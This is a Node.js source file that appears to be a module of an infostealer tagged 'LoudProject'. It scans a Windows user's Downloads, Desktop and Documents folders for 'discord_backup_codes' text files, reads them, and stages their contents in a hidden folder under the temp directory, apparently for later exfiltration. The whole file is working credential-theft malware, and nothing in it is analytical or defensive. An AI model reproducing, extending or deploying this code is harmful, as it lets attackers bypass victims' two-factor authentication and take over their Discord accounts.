const { rdm } = require("../../data/Config");
const fs = require("fs");
const os = require("os");

async function SearchDiscordCodes() {
  const homeDir = os.homedir();
  let str = "";

  if (fs.existsSync(`${homeDir}\\Downloads`)) {
    fs.readdirSync(`${homeDir}\\Downloads`).forEach((file) => {
      if (file.endsWith(".txt") && file.includes("discord_backup_codes")) {
        let path = `${homeDir}\\Downloads\\${file}`;

        str += "\n\nBACKUP CODES FROM: " + path + "  #LoudProject";
        str += `\n\n${fs.readFileSync(path).toString()}`;
      }
    });
  }
  if (fs.existsSync(`${homeDir}\\Desktop`)) {
    fs.readdirSync(`${homeDir}\\Desktop`).forEach((file) => {
      if (file.endsWith(".txt") && file.includes("discord_backup_codes")) {
        let path = `${homeDir}\\Desktop\\${file}`;

        str += "\n\nBACKUP CODES FROM: " + path + "  #LoudProject";
        str += `\n\n${fs.readFileSync(path).toString()}`;
      }
    });
  }
  if (fs.existsSync(`${homeDir}\\Documents`)) {
    fs.readdirSync(`${homeDir}\\Documents`).forEach((file) => {
      if (file.endsWith(".txt") && file.includes("discord_backup_codes")) {
        let path = `${homeDir}\\Documents\\${file}`;

        str += "\n\nBACKUP CODES FROM: " + path + "  #LoudProject";
        str += `\n\n${fs.readFileSync(path).toString()}`;
      }
    });
  }

  if (str) fs.writeFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\backup_codes.txt`, str.slice(2));
}

module.exports = { SearchDiscordCodes };
